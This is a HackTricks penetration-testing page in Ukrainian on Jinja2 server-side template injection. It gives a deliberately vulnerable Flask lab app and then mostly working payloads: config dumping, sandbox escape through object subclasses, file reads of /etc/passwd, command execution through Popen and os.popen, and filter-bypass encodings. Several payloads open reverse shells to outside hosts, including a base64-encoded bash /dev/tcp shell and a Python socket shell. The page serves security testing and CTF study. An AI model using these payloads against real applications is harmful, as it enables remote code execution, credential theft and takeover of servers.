# Jinja2 SSTI

{{#include ../../banners/hacktricks-training.md}}


## **Лабораторія**
```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/")
def home():
if request.args.get('c'):
return render_template_string(request.args.get('c'))
else:
return "Hello, send someting inside the param 'c'!"

if __name__ == "__main__":
app.run()
```
## **Різне**

### **Декларація налагодження**

Якщо розширення налагодження увімкнено, тег `debug` буде доступний для виведення поточного контексту, а також доступних фільтрів і тестів. Це корисно для того, щоб побачити, що доступно для використання в шаблоні без налаштування налагоджувача.
```python
<pre>

{% raw %}
{% debug %}
{% endraw %}








</pre>
```
### **Вивантажити всі змінні конфігурації**
```python
{{ config }} #In these object you can find all the configured env variables


{% raw %}
{% for key, value in config.items() %}
<dt>{{ key|e }}</dt>
<dd>{{ value|e }}</dd>
{% endfor %}
{% endraw %}






```
## **Jinja Injection**

По-перше, в Jinja-ін'єкції вам потрібно **знайти спосіб вийти з пісочниці** та відновити доступ до звичайного виконання python. Для цього вам потрібно **зловживати об'єктами**, які **належать** до **непісочницького середовища, але доступні з пісочниці**.

### Доступ до глобальних об'єктів

Наприклад, у коді `render_template("hello.html", username=username, email=email)` об'єкти username та email **походять з непісочницького python-середовища** і будуть **доступні** всередині **пісочницького середовища.**\
Більше того, є й інші об'єкти, які будуть **завжди доступні з пісочницького середовища**, це:
```
[]
''
()
dict
config
request
```
### Відновлення \<class 'object'>

Тоді, з цих об'єктів нам потрібно дістатися до класу: **`<class 'object'>`** для того, щоб спробувати **відновити** визначені **класи**. Це тому, що з цього об'єкта ми можемо викликати метод **`__subclasses__`** і **отримати доступ до всіх класів з не-пісочниці** python середовища.

Щоб отримати доступ до цього **об'єктного класу**, вам потрібно **отримати доступ до об'єкта класу** і потім отримати доступ або до **`__base__`**, **`__mro__()[-1]`** або `.`**`mro()[-1]`**. А потім, **після** досягнення цього **об'єктного класу** ми **викликаємо** **`__subclasses__()`**.

Перегляньте ці приклади:
```python
# To access a class object
[].__class__
''.__class__
()["__class__"] # You can also access attributes like this
request["__class__"]
config.__class__
dict #It's already a class

# From a class to access the class "object".
## "dict" used as example from the previous list:
dict.__base__
dict["__base__"]
dict.mro()[-1]
dict.__mro__[-1]
(dict|attr("__mro__"))[-1]
(dict|attr("\x5f\x5fmro\x5f\x5f"))[-1]

# From the "object" class call __subclasses__()
{{ dict.__base__.__subclasses__() }}
{{ dict.mro()[-1].__subclasses__() }}
{{ (dict.mro()[-1]|attr("\x5f\x5fsubclasses\x5f\x5f"))() }}

{% raw %}
{% with a = dict.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}

# Other examples using these ways
{{ ().__class__.__base__.__subclasses__() }}
{{ [].__class__.__mro__[-1].__subclasses__() }}
{{ ((""|attr("__class__")|attr("__mro__"))[-1]|attr("__subclasses__"))() }}
{{ request.__class__.mro()[-1].__subclasses__() }}
{% with a = config.__class__.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}
{% endraw %}






# Not sure if this will work, but I saw it somewhere
{{ [].class.base.subclasses() }}
{{ ''.class.mro()[1].subclasses() }}
```
### RCE Escaping

**Відновивши** `<class 'object'>` і викликавши `__subclasses__`, ми тепер можемо використовувати ці класи для читання та запису файлів і виконання коду.

Виклик `__subclasses__` дав нам можливість **отримати доступ до сотень нових функцій**, ми будемо задоволені, просто отримавши доступ до **класу файлів** для **читання/запису файлів** або будь-якого класу з доступом до класу, який **дозволяє виконувати команди** (як `os`).

**Читання/Запис віддаленого файлу**
```python
# ''.__class__.__mro__[1].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
```
**RCE**
```python
# The class 396 is the class <class 'subprocess.Popen'>
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}

# Without '{{' and '}}'

<div data-gb-custom-block data-tag="if" data-0='application' data-1='][' data-2='][' data-3='__globals__' data-4='][' data-5='__builtins__' data-6='__import__' data-7='](' data-8='os' data-9='popen' data-10='](' data-11='id' data-12='read' data-13=']() == ' data-14='chiv'> a </div>

# Calling os.popen without guessing the index of the class
{% raw %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("ls").read()}}{%endif%}{% endfor %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}

## Passing the cmd line in a GET param
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
{% endraw %}


## Passing the cmd line ?cmd=id, Without " and '
{{ dict.mro()[-1].__subclasses__()[276](request.args.cmd,shell=True,stdout=-1).communicate()[0].strip() }}

```
Щоб дізнатися про **більше класів**, які ви можете використовувати для **виходу**, ви можете **перевірити**:

{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

### Обхід фільтрів

#### Загальні обходи

Ці обходи дозволять нам **доступ** до **атрибутів** об'єктів **без використання деяких символів**.\
Ми вже бачили деякі з цих обходів у прикладах попереднього, але давайте підсумуємо їх тут:
```bash
# Without quotes, _, [, ]
## Basic ones
request.__class__
request["__class__"]
request['\x5f\x5fclass\x5f\x5f']
request|attr("__class__")
request|attr(["_"*2, "class", "_"*2]|join) # Join trick

## Using request object options
request|attr(request.headers.c) #Send a header like "c: __class__" (any trick using get params can be used with headers also)
request|attr(request.args.c) #Send a param like "?c=__class__
request|attr(request.query_string[2:16].decode() #Send a param like "?c=__class__
request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join) # Join list to string
http://localhost:5000/?c={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_ #Formatting the string from get params

## Lists without "[" and "]"
http://localhost:5000/?c={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_

# Using with

{% raw %}
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDEgMD4mMQ== | base64 -d | bash")["read"]() %} a {% endwith %}
{% endraw %}






```
- [**Поверніться сюди для отримання додаткових варіантів доступу до глобального об'єкта**](jinja2-ssti.md#accessing-global-objects)
- [**Поверніться сюди для отримання додаткових варіантів доступу до класу об'єкта**](jinja2-ssti.md#recovering-less-than-class-object-greater-than)
- [**Прочитайте це, щоб отримати RCE без класу об'єкта**](jinja2-ssti.md#jinja-injection-without-less-than-class-object-greater-than)

**Уникнення HTML кодування**

За замовчуванням Flask HTML кодує все всередині шаблону з міркувань безпеки:
```python
{{'<script>alert(1);</script>'}}
#will be
&lt;script&gt;alert(1);&lt;/script&gt;
```
**Фільтр `safe`** дозволяє нам впроваджувати JavaScript та HTML на сторінку **без** його **HTML кодування**, ось так:
```python
{{'<script>alert(1);</script>'|safe}}
#will be
<script>alert(1);</script>
```
**RCE шляхом написання злого конфігураційного файлу.**
```python
# evil config
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}

# load the evil config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}

# connect to evil host
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
```
## Без кількох символів

Без **`{{`** **`.`** **`[`** **`]`** **`}}`** **`_`**
```python
{% raw %}
{%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls${IFS}-l')|attr('read')()%}{%print(a)%}{%endwith%}
{% endraw %}






```
## Jinja Injection без **\<class 'object'>**

З [**глобальних об'єктів**](jinja2-ssti.md#accessing-global-objects) є інший спосіб отримати **RCE без використання цього класу.**\
Якщо вам вдасться отримати доступ до будь-якої **функції** з цих глобальних об'єктів, ви зможете отримати доступ до **`__globals__.__builtins__`** і звідти **RCE** буде дуже **простим**.

Ви можете **знайти функції** з об'єктів **`request`**, **`config`** та будь-якого **іншого** цікавого **глобального об'єкта**, до якого у вас є доступ, за допомогою:
```bash
{{ request.__class__.__dict__ }}
- application
- _load_form_data
- on_json_loading_failed

{{ config.__class__.__dict__ }}
- __init__
- from_envvar
- from_pyfile
- from_object
- from_file
- from_json
- from_mapping
- get_namespace
- __repr__

# You can iterate through children objects to find more
```
Якщо ви знайшли деякі функції, ви можете відновити вбудовані функції за допомогою:
```python
# Read file
{{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}

# RCE
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }}
{{ config.__class__.from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}
{{ (config|attr("__class__")).from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}

{% raw %}
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("ls")["read"]() %} {{ a }} {% endwith %}
{% endraw %}


## Extra
## The global from config have a access to a function called import_string
## with this function you don't need to access the builtins
{{ config.__class__.from_envvar.__globals__.import_string("os").popen("ls").read() }}

# All the bypasses seen in the previous sections are also valid
```
### Fuzzing WAF bypass

**Fenjing** [https://github.com/Marven11/Fenjing](https://github.com/Marven11/Fenjing) - це інструмент, який спеціалізується на CTF, але також може бути корисним для брутфорсу недійсних параметрів у реальному сценарії. Інструмент просто розпорошує слова та запити для виявлення фільтрів, шукаючи обходи, а також надає інтерактивну консоль.
```
webui:
As the name suggests, web UI
Default port 11451

scan: scan the entire website
Extract all forms from the website based on the form element and attack them
After the scan is successful, a simulated terminal will be provided or the given command will be executed.
Example:python -m fenjing scan --url 'http://xxx/'

crack: Attack a specific form
You need to specify the form's url, action (GET or POST) and all fields (such as 'name')
After a successful attack, a simulated terminal will also be provided or a given command will be executed.
Example:python -m fenjing crack --url 'http://xxx/' --method GET --inputs name

crack-path: attack a specific path
Attack http://xxx.xxx/hello/<payload>the vulnerabilities that exist in a certain path (such as
The parameters are roughly the same as crack, but you only need to provide the corresponding path
Example:python -m fenjing crack-path --url 'http://xxx/hello/'

crack-request: Read a request file for attack
Read the request in the file, PAYLOADreplace it with the actual payload and submit it
The request will be urlencoded by default according to the HTTP format, which can be --urlencode-payload 0turned off.
```
## Посилання

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)
- Перевірте [attr trick to bypass blacklisted chars in here](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/#python3).
- [https://twitter.com/SecGus/status/1198976764351066113](https://twitter.com/SecGus/status/1198976764351066113)
- [https://hackmd.io/@Chivato/HyWsJ31dI](https://hackmd.io/@Chivato/HyWsJ31dI)

{{#include ../../banners/hacktricks-training.md}}
